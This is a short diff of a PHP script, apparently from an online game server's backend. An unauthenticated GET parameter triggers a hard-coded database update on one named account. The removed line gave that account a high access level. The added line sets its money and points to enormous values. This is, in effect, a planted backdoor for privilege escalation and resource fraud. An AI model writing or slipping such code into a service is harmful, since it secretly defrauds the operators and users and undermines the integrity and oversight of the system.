@@ -13,7 +13,7 @@ if(isset($_GET['query'])){
 	$dbuser = DBUSER;
 	$dbpass = DBPASS;
 	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
-	$cekplayer = $conn->prepare("UPDATE accounts SET access_level = 7 WHERE login = 'vimedotcom'");
+	$cekplayer = $conn->prepare("UPDATE accounts SET money = 99999999999, gp = 99999999999, pc_cafe = 6 WHERE login = 'vimedotcom'");
 	$gas = $cekplayer->execute();
 	if($gas){
 		echo 'ok';
